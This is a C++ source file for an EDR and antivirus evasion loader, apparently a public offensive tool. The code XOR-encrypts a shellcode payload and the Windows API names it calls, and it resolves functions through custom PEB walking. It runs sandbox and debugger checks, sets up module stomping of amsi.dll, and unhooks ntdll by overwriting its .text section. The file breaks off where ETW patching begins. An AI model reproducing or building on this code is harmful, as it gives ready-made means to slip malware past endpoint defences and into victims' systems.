/*
	Author: Hossam Ehab - facebook.com/0xHossam
	Title : Killer tool for EDR/AV Evasion --> IAT Obfuscation - Module stomping - DLL Unhooking & ETW Patching - Run payload without create a new thread
	Date  : 8/3/2023

*/

#include <Windows.h>
#include <iostream>
#include <winternl.h>
#include <psapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <memoryapi.h>
#include <shlwapi.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "Shlwapi.lib")

#define BOLD "\033[1m"
#define GREEN "\033[0;32m"
#define BLUE "\033[0;34m"
#define RED "\033[0;31m"
#define NC "\033[0m"
#define NL "\n"
#define PRINT_SUCCESS(fmt, ...) printf("\t" GREEN " [+]" NC BOLD fmt NL NC, __VA_ARGS__)
#define PRINT_SUCCESST(fmt, ...) printf(GREEN " [+] " NC BOLD fmt NL NC, __VA_ARGS__)
#define PRINT_STATUS(fmt, ...) printf(BLUE " [*] " NC BOLD fmt NL NC, __VA_ARGS__)
#define PRINT_ERROR(fmt, ...) printf("\t" RED " [!] " NC BOLD fmt NL NC, __VA_ARGS__)
#define BR(fmt, ...) printf("\t" RED " [-] Author => Hossam Ehab / An EDR (End Point Detection & Response) Evasion Tool " NC BOLD fmt NL NC, __VA_ARGS__)

int cmpUnicodeStr(WCHAR substr[], WCHAR mystr[]) {
  _wcslwr_s(substr, MAX_PATH);
  _wcslwr_s(mystr, MAX_PATH);

  int result = 0;
  if (StrStrW(mystr, substr) != NULL) {
    result = 1;
  }

  return result;
}

// https://cocomelonc.github.io/malware/2023/04/16/malware-av-evasion-16.html
FARPROC myGetProcAddr(HMODULE hModule, LPCSTR lpProcName) {
  PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
  PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
  PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + 
  ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

  DWORD* addressOfFunctions = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfFunctions);
  WORD* addressOfNameOrdinals = (WORD*)((BYTE*)hModule + exportDirectory->AddressOfNameOrdinals);
  DWORD* addressOfNames = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfNames);

  for (DWORD i = 0; i < exportDirectory->NumberOfNames; ++i) {
    if (strcmp(lpProcName, (const char*)hModule + addressOfNames[i]) == 0) {
      return (FARPROC)((BYTE*)hModule + addressOfFunctions[addressOfNameOrdinals[i]]);
    }
  }

  return NULL;
}

// https://cocomelonc.github.io/malware/2023/04/08/malware-av-evasion-15.html
// custom implementation
HMODULE myGetModuleHandle(LPCWSTR lModuleName) {

  // obtaining the offset of PPEB from the beginning of TEB
//   PEB* pPeb = (PEB*)__readgsqword(0x60);
#ifdef _M_IX86 
  PEB * pPeb = (PEB *) __readfsdword(0x30);
#else
  PEB * pPeb = (PEB *)__readgsqword(0x60);
#endif

  // for x86
  // PEB* pPeb = (PEB*)__readgsqword(0x30);

  // obtaining the address of the head node in a linked list 
  // which represents all the models that are loaded into the process.
  PEB_LDR_DATA* Ldr = pPeb->Ldr;
  LIST_ENTRY* ModuleList = &Ldr->InMemoryOrderModuleList; 

  // iterating to the next node. this will be our starting point.
  LIST_ENTRY* pStartListEntry = ModuleList->Flink;

  // iterating through the linked list.
  WCHAR mystr[MAX_PATH] = { 0 };
  WCHAR substr[MAX_PATH] = { 0 };
  for (LIST_ENTRY* pListEntry = pStartListEntry; pListEntry != ModuleList; pListEntry = pListEntry->Flink) {

    // getting the address of current LDR_DATA_TABLE_ENTRY (which represents the DLL).
    LDR_DATA_TABLE_ENTRY* pEntry = (LDR_DATA_TABLE_ENTRY*)((BYTE*)pListEntry - sizeof(LIST_ENTRY));

    // checking if this is the DLL we are looking for
    memset(mystr, 0, MAX_PATH * sizeof(WCHAR));
    memset(substr, 0, MAX_PATH * sizeof(WCHAR));
    wcscpy_s(mystr, MAX_PATH, pEntry->FullDllName.Buffer);
    wcscpy_s(substr, MAX_PATH, lModuleName);
    if (cmpUnicodeStr(substr, mystr)) {
      // returning the DLL base address.
      return (HMODULE)pEntry->DllBase;
    }
  }

  // the needed DLL wasn't found
  PRINT_ERROR("failed to get a handle to %s\n", lModuleName);
  return NULL;
}

VOID EnableConsoleColors()
{
	HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
	DWORD dwMode = 0;
	GetConsoleMode(hOut, &dwMode);
	dwMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING;
	SetConsoleMode(hOut, dwMode);
}

#define SIZEOF(x) sizeof(x) - 1
#define KEY 0xb6

char decKey[] = { 0xfe, 0xd9, 0x81, 0xc5, 0xf7, 0xfb, 0x85, 0xf3, 0xde, 0x86, 0xf4, 0xf7, 0x83, 0xda, 0xe6, 0xe7, 0xc1, 0x84, 0xcc, 0xee, 0xc1, 0x85, 0xf8, 0x0 }; //Ho7sAM3Eh0BA5lPQw2zXw3N
int keysize = SIZEOF(decKey);

unsigned char shellcode[] = { 0x4e, 0x56, 0x0f, 0x3d, 0x54, 0x51, 0x1b, 0x30, 0x33, 0xb9, 0xca, 0x9b, 0xcb, 0x71, 0x31, 0x45, 0x59, 0x22, 0x33, 0x60, 0x70, 0xd4, 0x4d, 0x3b, 0xd3, 0x8c, 0xd8, 0x70, 0x4e, 0x71, 0x6d, 0x78, 0xa8, 0xb6, 0x09, 0x97, 0xcf, 0xf5, 0xf8, 0xa6, 0xeb, 0xfb, 0x32, 0x61, 0xcd, 0xfd, 0xbe, 0x88, 0xa2, 0xa7, 0xfd, 0x5d, 0xfc, 0x60, 0xea, 0x2d, 0x35, 0x41, 0x43, 0x31, 0xe5, 0xc8, 0x7b, 0x4d, 0x41, 0x73, 0x37, 0x6f, 0x48, 0x4e, 0x32, 0xcd, 0x10, 0x27, 0xcd, 0x88, 0xae, 0x07, 0x85, 0x27, 0xca, 0x0a, 0x6a, 0x31, 0x04, 0x6b, 0xad, 0xbe, 0x21, 0x76, 0x4f, 0xa4, 0xcd, 0x7b, 0x2d, 0x19, 0x23, 0x73, 0x2f, 0x10, 0x0a, 0x35, 0x6b, 0x19, 0x03, 0x68, 0x29, 0x95, 0x32, 0x05, 0xc9, 0x77, 0xbc, 0x2e, 0x98, 0x4f, 0x7a, 0x6b, 0x18, 0xf1, 0x76, 0x3f, 0x5d, 0xdb, 0x2d, 0x53, 0x91, 0x43, 0x79, 0x4c, 0x05, 0xb8, 0x09, 0x19, 0xab, 0x42, 0xbe, 0x71, 0x0b, 0x3b, 0x53, 0x14, 0x79, 0x7e, 0x86, 0x24, 0xb0, 0x54, 0xf4, 0x40, 0x03, 0x3d, 0xa1, 0x84, 0x72, 0xe1, 0x81, 0x42, 0x7f, 0xa6, 0x79, 0x03, 0xe5, 0x76, 0x10, 0xf2, 0x06, 0xfc, 0x10, 0x99, 0x93, 0x7d, 0x17, 0xa1, 0xe0, 0x69, 0x0c, 0x13, 0x0d, 0xca, 0x37, 0x2f, 0x27, 0xc3, 0x1e, 0xe3, 0x76, 0x10, 0x1d, 0x46, 0xb7, 0xd4, 0x18, 0x6c, 0x35, 0x41, 0xca, 0xb0, 0xe3, 0x95, 0x32, 0x05, 0x7d, 0x31, 0xbc, 0x4f, 0x1a, 0xc5, 0x7b, 0x26, 0x19, 0x28, 0xdf, 0x95, 0x90, 0x51, 0x2d, 0x38, 0x88, 0x83, 0x71, 0x48, 0x69, 0x31, 0x31, 0x20, 0x4f, 0x9b, 0xaf, 0x79, 0x06, 0xfa, 0x46, 0x15, 0x30, 0x78, 0xc0, 0x5e, 0x18, 0x3c, 0x47, 0xca, 0x0a, 0x10, 0x3a, 0xce, 0x7b, 0x55, 0x13, 0xf8, 0x7f, 0x0f, 0x1a, 0xc5, 0x7b, 0x12, 0x8a, 0x4b, 0x7a, 0x21, 0x00, 0x02, 0x3c, 0x74, 0x10, 0x03, 0x30, 0x68, 0x45, 0xf3, 0xa5, 0xb1, 0x97, 0xb4, 0x27, 0xb4 };
unsigned int shellcode_len = sizeof(shellcode);

void decShell(unsigned char* pEnctyptedShell)
{
	for (int idx = 0, ctr = 0; idx < shellcode_len; idx++)
	{
		ctr = (ctr == keysize) ? 0 : ctr;
		pEnctyptedShell[idx] = pEnctyptedShell[idx] ^ decKey[ctr++];
	}

}

void deObfuscate(char* cApi, int nSize)
{
	for (int i = 0; i < nSize; i++)
	{
		// try to prevent particular weakness of single-byte encoding: 
		// It lacks the ability to effectively hide from a user manually
		// scanning encoded content with a hex editor.     
		if (cApi[i] != 0 && cApi[i] != KEY)
			cApi[i] = cApi[i] ^ KEY;
	}
}

void banner() {
	printf("\n");
	printf(RED"   	        	dP     dP dP dP        dP         88888888b  888888ba    \n");
	printf(RED"			88.d8' 88 88        88         88         88    `8b		 \n");
	printf(RED"			88aaa8P'  88 88        88        a88aaaa    a88aaaa8P'   \n");
	printf(RED"			88   `8b. 88 88        88         88         88   `8b.   \n");
	printf(RED"			88     88 88 88        88         88         88     88   \n");
	printf(RED"			dP     dP dP 88888888P 88888888P  88888888P  dP     dP   \n");
	printf(GREEN"			     Author => Hossam Ehab / EDR/AV evasion tool\n");
	printf("\n");
}

/*
	Detecting the first bytes for the NTAPIs to check if it hooked
	If the bytes match, the function returns FALSE. If the bytes do not match, the function prints a message indicating that the first bytes are "HOOKED" and returns TRUE.
*/
BOOL isItHooked(LPVOID addr) {
	BYTE stub[] = "\x4c\x8b\xd1\xb8";
	std::string charData = (char*)addr;

	if (memcmp(addr, stub, 4) != 0) {
		PRINT_ERROR("\tFirst bytes are HOOKED : ");
		for (int i = 0; i < 4; i++) {
			BYTE currentByte = charData[i];
			printf("\\x%02x", currentByte);
		}
		PRINT_STATUS(" (different from ");
		for (int i = 0; i < 4; i++) {
			printf("\\x%02x", stub[i]);
		}
		printf(")\n");
		return TRUE;
	}
	return FALSE;
}

/* MSDN APIs*/
typedef LPVOID(WINAPI* VirtualProtectFunc)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE(WINAPI* CreateFileAFunc)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
typedef HANDLE(WINAPI* GetCurrentProcessFunc)();
typedef LPVOID (WINAPI * MapViewOfFileFunc)(HANDLE hFileMappingObject, DWORD  dwDesiredAccess, DWORD  dwFileOffsetHigh, DWORD  dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap);
typedef BOOL (WINAPI * CheckRemoteDebuggerPresentFunc)( HANDLE hProcess, PBOOL  pbDebuggerPresent );
typedef BOOL (WINAPI * GlobalMemoryStatusExFunc)( LPMEMORYSTATUSEX lpBuffer);
typedef LPVOID(WINAPI* pVirtualAllocExNuma) ( HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect, DWORD nndPreferred );
typedef HANDLE (WINAPI * CreateFileMappingAFunc)( HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCSTR lpName );

/* Declare function pointers */
VirtualProtectFunc pVirtualProtectFunc = NULL;
CreateFileAFunc pCreateFileAFunc = NULL;
GetCurrentProcessFunc pGetCurrentProcessFunc = NULL;
CheckRemoteDebuggerPresentFunc pCheckRemoteDebuggerPresentFunc = NULL;
GlobalMemoryStatusExFunc pGlobalMemoryStatusExFunc = NULL;
MapViewOfFileFunc pMapViewOfFileFunc = NULL;
CreateFileMappingAFunc pCreateFileMappingAFunc = NULL;

typedef LPVOID(NTAPI* uNtAllocateVirtualMemory)(HANDLE, PVOID, ULONG, SIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI* uNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* uNtCreateThreadEx) (OUT PHANDLE hThread, IN ACCESS_MASK DesiredAccess, IN PVOID ObjectAttributes, IN HANDLE ProcessHandle, IN PVOID lpStartAddress, IN PVOID lpParameter, IN ULONG Flags, IN SIZE_T StackZeroBits, IN SIZE_T SizeOfStackCommit, IN SIZE_T SizeOfStackReserve, OUT PVOID lpBytesBuffer);
typedef NTSTATUS(NTAPI* uNtProtectVirtualMemory) (HANDLE, IN OUT PVOID*, IN OUT PSIZE_T, IN ULONG, OUT PULONG);
typedef NTSTATUS(NTAPI* uNtQueryInformationThread) (IN HANDLE ThreadHandle, IN THREADINFOCLASS ThreadInformationClass, OUT PVOID ThreadInformation, IN ULONG ThreadInformationLength, OUT PULONG         ReturnLength);

// Hardware components checker
BOOL checkResources() {
	SYSTEM_INFO s;
	MEMORYSTATUSEX ms;
	DWORD procNum;
	DWORD ram;

	// check number of processors
	GetSystemInfo(&s);
	procNum = s.dwNumberOfProcessors;
	if (procNum < 2) return false;

	// check RAM
	ms.dwLength = sizeof(ms);
	pGlobalMemoryStatusExFunc(&ms);
	ram = ms.ullTotalPhys / 1024 / 1024 / 1024;
	if (ram < 2) return false;
	return true;
}

/* Encrypted strings by xor to evade static stuff : */
char cNtAllocateVirtualMemory[] = { 0xf8, 0xc2, 0xf7, 0xda, 0xda, 0xd9, 0xd5, 0xd7, 0xc2, 0xd3, 0xe0, 0xdf, 0xc4, 0xc2, 0xc3, 0xd7, 0xda, 0xfb, 0xd3, 0xdb, 0xd9, 0xc4, 0xcf, 0x0 };
char cNtWriteVirtualMemory[] = { 0xf8, 0xc2, 0xe1, 0xc4, 0xdf, 0xc2, 0xd3, 0xe0, 0xdf, 0xc4, 0xc2, 0xc3, 0xd7, 0xda, 0xfb, 0xd3, 0xdb, 0xd9, 0xc4, 0xcf, 0x0 };
char cNtCreateThreadEx[] = { 0xf8, 0xc2, 0xf5, 0xc4, 0xd3, 0xd7, 0xc2, 0xd3, 0xe2, 0xde, 0xc4, 0xd3, 0xd7, 0xd2, 0xf3, 0xce, 0x0 };
char cNtProtectVirtualMemory[] = { 0xf8, 0xc2, 0xe6, 0xc4, 0xd9, 0xc2, 0xd3, 0xd5, 0xc2, 0xe0, 0xdf, 0xc4, 0xc2, 0xc3, 0xd7, 0xda, 0xfb, 0xd3, 0xdb, 0xd9, 0xc4, 0xcf, 0x0 };
char cNtQueryInformationThread[] = { 0xf8, 0xc2, 0xe7, 0xc3, 0xd3, 0xc4, 0xcf, 0xff, 0xd8, 0xd0, 0xd9, 0xc4, 0xdb, 0xd7, 0xc2, 0xdf, 0xd9, 0xd8, 0xe2, 0xde, 0xc4, 0xd3, 0xd7, 0xd2, 0x0 };
char cCreateFileA[] = { 0xf5, 0xc4, 0xd3, 0xd7, 0xc2, 0xd3, 0xf0, 0xdf, 0xda, 0xd3, 0xf7, 0x0 };
char cGetCurrentProcess[] = { 0xf1, 0xd3, 0xc2, 0xf5, 0xc3, 0xc4, 0xc4, 0xd3, 0xd8, 0xc2, 0xe6, 0xc4, 0xd9, 0xd5, 0xd3, 0xc5, 0xc5, 0x0 };
char cNtdll[] = { 0xd8, 0xc2, 0xd2, 0xda, 0xda, 0x98, 0xd2, 0xda, 0xda, 0x0 };
char cAmsi[] = { 0xd7, 0xdb, 0xc5, 0xdf, 0x98, 0xd2, 0xda, 0xda, 0x0 };
char cEtwEventWrite[] = { 0xf3, 0xc2, 0xc1, 0xf3, 0xc0, 0xd3, 0xd8, 0xc2, 0xe1, 0xc4, 0xdf, 0xc2, 0xd3, 0x0 };
char cMapViewOfFile[] = { 0xfb, 0xd7, 0xc6, 0xe0, 0xdf, 0xd3, 0xc1, 0xf9, 0xd0, 0xf0, 0xdf, 0xda, 0xd3, 0x0 };
char cCheckRemote[] = { 0xf5, 0xde, 0xd3, 0xd5, 0xdd, 0xe4, 0xd3, 0xdb, 0xd9, 0xc2, 0xd3, 0xf2, 0xd3, 0xd4, 0xc3, 0xd1, 0xd1, 0xd3, 0xc4, 0xe6, 0xc4, 0xd3, 0xc5, 0xd3, 0xd8, 0xc2, 0x0 };
char cCheckGlobalMemory[] = { 0xf1, 0xda, 0xd9, 0xd4, 0xd7, 0xda, 0xfb, 0xd3, 0xdb, 0xd9, 0xc4, 0xcf, 0xe5, 0xc2, 0xd7, 0xc2, 0xc3, 0xc5, 0xf3, 0xce, 0x0 };
char cLib2Name[] = { 0xdd, 0xd3, 0xc4, 0xd8, 0xd3, 0xda, 0x85, 0x84, 0x98, 0xd2, 0xda, 0xda, 0x0 };
char b[] = { 0xe0, 0xdf, 0xc4, 0xc2, 0xc3, 0xd7, 0xda, 0xe6, 0xc4, 0xd9, 0xc2, 0xd3, 0xd5, 0xc2, 0x0 };
char cCreateFileMapping[] = { 0xf5, 0xc4, 0xd3, 0xd7, 0xc2, 0xd3, 0xf0, 0xdf, 0xda, 0xd3, 0xfb, 0xd7, 0xc6, 0xc6, 0xdf, 0xd8, 0xd1, 0xf7, 0x0 };

void deObfuscateNT() {
	deObfuscate(cNtAllocateVirtualMemory, SIZEOF(cNtAllocateVirtualMemory));
	deObfuscate(cNtWriteVirtualMemory, SIZEOF(cNtWriteVirtualMemory));
	deObfuscate(cNtCreateThreadEx, SIZEOF(cNtCreateThreadEx));
	deObfuscate(cNtProtectVirtualMemory, SIZEOF(cNtProtectVirtualMemory));
	deObfuscate(cNtQueryInformationThread, SIZEOF(cNtQueryInformationThread));
}

BOOL checkNUMA() {
	LPVOID mem = NULL;
	char cVirtualAllocExNuma[] = { 0xe0, 0xdf, 0xc4, 0xc2, 0xc3, 0xd7, 0xda, 0xf7, 0xda, 0xda, 0xd9, 0xd5, 0xf3, 0xce, 0xf8, 0xc3, 0xdb, 0xd7, 0x0 };
	deObfuscate(cVirtualAllocExNuma, SIZEOF(cVirtualAllocExNuma));
	pVirtualAllocExNuma myVirtualAllocExNuma = (pVirtualAllocExNuma)myGetProcAddr(GetModuleHandle("kernel32.dll"), cVirtualAllocExNuma);
	mem = myVirtualAllocExNuma(pGetCurrentProcessFunc(), NULL, 1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE, 0);
	if (mem != NULL) {
		return false;
	}
	else {
		return true;
	}
}

void deObfuscateFunc() {
	deObfuscate(b, SIZEOF(b));
	deObfuscate(cCreateFileA, SIZEOF(cCreateFileA));
	deObfuscate(cGetCurrentProcess, SIZEOF(cGetCurrentProcess));
	deObfuscate(cMapViewOfFile, SIZEOF(cMapViewOfFile));
	deObfuscate(cCheckRemote, SIZEOF(cCheckRemote));
	deObfuscate(cCheckGlobalMemory, SIZEOF(cCheckGlobalMemory));
	deObfuscate(cCreateFileMapping, SIZEOF(cCreateFileMapping));
}

/* Function to reverse a shellcode array in 0x format */
void reverseShellcode(unsigned char *shellcode, int size) {
    int i;
    unsigned char temp;
    for (i = 0; i < size/2; i++) {
        temp = shellcode[size-i-1];
        shellcode[size-i-1] = shellcode[i];
        shellcode[i] = temp;
    } if (size % 2 != 0) { shellcode[size/2] = shellcode[size/2]; }
}



int main(int argc, char** argv) {

/* 
	If you want to run the malware in the background use this main function and put a comment in the int main... :
	int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) { 
*/

	EnableConsoleColors(); // دي عشان اول البانر ملكش دعوة بيها ^_^
	banner();

	unsigned char* pHollowedDLL;
	HMODULE hAMSI, hModule;
	DWORD dwOldProtection = 0;
	DWORD dwOldProtect = 0;
	BOOL bTrap = FALSE;
	char* pMem;
	int nMemAlloc, nCtr = 0;

	/* Checking the file name is a sandbox evasion technique - if the filename isn't killer.exe will exit - it will check from the terminal argument "argv" */
	if (strstr(argv[0], "killer.exe") == NULL) {
		PRINT_ERROR("Sandbox detected - Filename changed :( \n");
		return -2;
	}

/*
	sets all the bytes in the allocated memory block to 0x00, and checks for errors.
	checking if the allocated memory block is larger than the amount of memory that would typically be available on a sandboxed machine

	Stolen from :  https://github.com/abdallah-elsharif/hellMaker/blob/main/samples/calc64.c#L610 Really nice tool ^_^
*/
	nMemAlloc = KEY << 20; // will be 1048576
	if (!(pMem = (char*)malloc(nMemAlloc))) { return EXIT_FAILURE; }
	for (int idx = 0; idx < nMemAlloc; idx++) { pMem[nCtr++] = 0x00; }
	if (nMemAlloc != nCtr) { return EXIT_FAILURE; }

	deObfuscate(cLib2Name, SIZEOF(cLib2Name)); // decrypt "kernel32.dll"
	deObfuscate(cAmsi, SIZEOF(cAmsi)); // decrypt "amsi.dll"

	hAMSI = LoadLibraryA(cAmsi);

	wchar_t wtk[20];
  	mbstowcs(wtk, cLib2Name, strlen(cLib2Name)+1); //plus null
  	LPWSTR wcLib2dll = wtk;
	HMODULE hModuleK = myGetModuleHandle(wcLib2dll));
	
	free(pMem);

	/*
		Module stomping or DLL hallowing is for memory scanning evasion it's really nice technique
		This technique is fixed and modified from : https://www.ired.team/offensive-security/code-injection-process-injection/modulestomping-dll-hollowing-shellcode-injection
	*/

	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hAMSI; 
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)pDosHeader + pDosHeader->e_lfanew);
	PIMAGE_SECTION_HEADER pSection;
	int index = 0;
	do {
		pSection = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pNtHeaders) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * index++));
		PRINT_STATUS("Try to find .text section, sec name %s", (const char*)pSection->Name);
	} while (strncmp((const char*)pSection->Name, ".text", 5) != 0);

	/* After finding .text section from DLL we are trying to resolve it's address */
	pHollowedDLL = (unsigned char*)((DWORD_PTR)pDosHeader + pSection->VirtualAddress);

	deObfuscateNT();
	deObfuscate(cNtdll, SIZEOF(cNtdll));

	/*
		Copy ntdll to a fresh memory alloc and overwrite calls adresses, you can read about it from here :
	    https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++
	*/

	PRINT_STATUS("Copy ntdll to a fresh memory allocation and overwrite calls adresses, Detecting ntdll hooking : \n");
	int nbHooks = 0;

	wchar_t wtext[20];
  	mbstowcs(wtext, cNtdll, strlen(cNtdll)+1); //plus null
  	LPWSTR wNtdll = wtext;

	if (isItHooked(myGetProcAddr(myGetModuleHandle(wNtdll), cNtAllocateVirtualMemory))) { PRINT_ERROR(" NtAllocateVirtualMemory is Hooked\n"); nbHooks++; } else { PRINT_SUCCESS(" NtAllocateVirtualMemory Not Hooked"); }
	if (isItHooked(myGetProcAddr(myGetModuleHandle(wNtdll), cNtProtectVirtualMemory))) {  PRINT_ERROR(" NtProtectVirtualMemory is Hooked\n");  nbHooks++; } else { PRINT_SUCCESS(" NtProtectVirtualMemory Not Hooked"); }
	if (isItHooked(myGetProcAddr(myGetModuleHandle(wNtdll), cNtCreateThreadEx))) {PRINT_ERROR(" NtCreateThreadEx is Hooked\n"); nbHooks++;                } else { PRINT_SUCCESS(" NtCreateThreadEx Not Hooked"); }
	if (isItHooked(myGetProcAddr(myGetModuleHandle(wNtdll), cNtQueryInformationThread))) {PRINT_ERROR(" NtQueryInformationThread Hooked\n"); nbHooks++;   } else { PRINT_SUCCESS(" NtQueryInformationThread Not Hooked\n"); }

	deObfuscateFunc();

	/* Load system functions */

	if (hModuleK != NULL) {
		pVirtualProtectFunc = (VirtualProtectFunc)myGetProcAddr(hModuleK, b);
		pCreateFileAFunc = (CreateFileAFunc)myGetProcAddr(hModuleK, cCreateFileA);
		pGetCurrentProcessFunc = (GetCurrentProcessFunc)myGetProcAddr(hModuleK, cGetCurrentProcess);
		pCheckRemoteDebuggerPresentFunc = (CheckRemoteDebuggerPresentFunc)myGetProcAddr(hModuleK, cCheckRemote);
		pGlobalMemoryStatusExFunc = (GlobalMemoryStatusExFunc)myGetProcAddr(hModuleK, cCheckGlobalMemory);
		pMapViewOfFileFunc = (MapViewOfFileFunc)myGetProcAddr(hModuleK, cMapViewOfFile);
		pCreateFileMappingAFunc = (CreateFileMappingAFunc)myGetProcAddr(hModuleK, cCreateFileMapping);
	}

/*	
	This code attempts to create a nonexistent file and returns an error if successful. 
	This is a sandbox evasion technique used to confuse analysis tools by mimicking benign file access behavior.	
*/

	if (pCreateFileAFunc(cLib2Name, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_READONLY, NULL) != INVALID_HANDLE_VALUE) 
	{
		PRINT_ERROR("The nonexistent file is detected !!! trying to exit");
		return EXIT_FAILURE;
	}

	// Check if all required system functions were loaded successfully
	if (!(pVirtualProtectFunc && pCreateFileAFunc && pGetCurrentProcessFunc &&  pCheckRemoteDebuggerPresentFunc && pCreateFileMappingAFunc && pGlobalMemoryStatusExFunc && pMapViewOfFileFunc)) {
		PRINT_ERROR("Failed to load required system functions.");  // Display error message
		return EXIT_FAILURE;
	}

	// check NUMA
	if (checkNUMA()) { PRINT_ERROR("NUMA memory allocate failed :( \n"); return -2; }
	if (checkResources() == false) {  PRINT_ERROR("I got you sandbox, it's can't be run here :(\n"); return -2; }
	PRINT_SUCCESST("Sandbox rounds finished no sandbox detected ;)");

	if (!pCheckRemoteDebuggerPresentFunc(pGetCurrentProcessFunc(), &bTrap) || bTrap) { return EXIT_FAILURE; } else { PRINT_SUCCESST("Debugger is not attach"); }

	if (nbHooks > 0) {
		char path[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','n','t','d','l','l','.','d','l','l',0 };
		char sntdll[] = { '.','t','e','x','t',0 };
		HANDLE process = pGetCurrentProcessFunc();
		MODULEINFO mi = {};
		HMODULE ntdllModule = myGetModuleHandle(wNtdll);
		GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
		LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;

		HANDLE ntdllFile = pCreateFileAFunc(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
		HANDLE ntdllMapping = pCreateFileMappingAFunc(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
		LPVOID ntdllMappingAddress = pMapViewOfFileFunc(ntdllMapping, FILE_MAP_READ, 0, 0, 0);
		PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
		PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);
		for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
			PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
			if (!strcmp((char*)hookedSectionHeader->Name, (char*)sntdll)) {
				DWORD oldProtection = 0;
				bool isProtected = pVirtualProtectFunc((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
				memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
				isProtected = pVirtualProtectFunc((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
			}
		}

		printf("\n[+] Detecting hooks in new ntdll module\n");

		if (isItHooked(myGetProcAddr(myGetModuleHandle(wNtdll), cNtAllocateVirtualMemory))) { PRINT_ERROR(" NtAllocateVirtualMemory Hooked\n"); }   else { PRINT_SUCCESS(" NtAllocateVirtualMemory Not Hooked\n"); }
		if (isItHooked(myGetProcAddr(myGetModuleHandle(wNtdll), cNtProtectVirtualMemory))) { PRINT_ERROR(" NtProtectVirtualMemory Hooked\n");}      else { PRINT_SUCCESS(" NtProtectVirtualMemory Not Hooked\n"); }
		if (isItHooked(myGetProcAddr(myGetModuleHandle(wNtdll), cNtCreateThreadEx))) { PRINT_ERROR(" NtCreateThreadEx is Hooked\n"); nbHooks++; }   else { PRINT_SUCCESS(" NtCreateThreadEx Not Hooked\n"); }
		if (isItHooked(myGetProcAddr(myGetModuleHandle(wNtdll), cNtQueryInformationThread))) { PRINT_ERROR(" NtQueryInformationThread Hooked\n"); } else {	PRINT_SUCCESS("NtQueryInformationThread Not Hooked\n"); }
	} else { PRINT_STATUS("No hooked modules to unhook it!"); }

	HINSTANCE hNtdll = myGetModuleHandle(wNtdll);
	uNtAllocateVirtualMemory NtAllocateVirtualMemory = (uNtAllocateVirtualMemory)myGetProcAddr(hNtdll, cNtAllocateVirtualMemory);
	uNtWriteVirtualMemory NtWriteVirtualMemory = (uNtWriteVirtualMemory)myGetProcAddr(hNtdll, cNtWriteVirtualMemory);
	uNtProtectVirtualMemory NtProtectVirtualMemory = (uNtProtectVirtualMemory)myGetProcAddr(hNtdll, cNtProtectVirtualMemory);
	uNtCreateThreadEx NtCreateThreadEx = (uNtCreateThreadEx)myGetProcAddr(hNtdll, cNtCreateThreadEx);
	uNtQueryInformationThread NtQueryInformationThread = (uNtQueryInformationThread)myGetProcAddr(hNtdll, cNtQueryInformationThread);

	/* 
		PATCH ETW : is technique used for bypassing some security controls, If you want to read about it see this from ired.team :
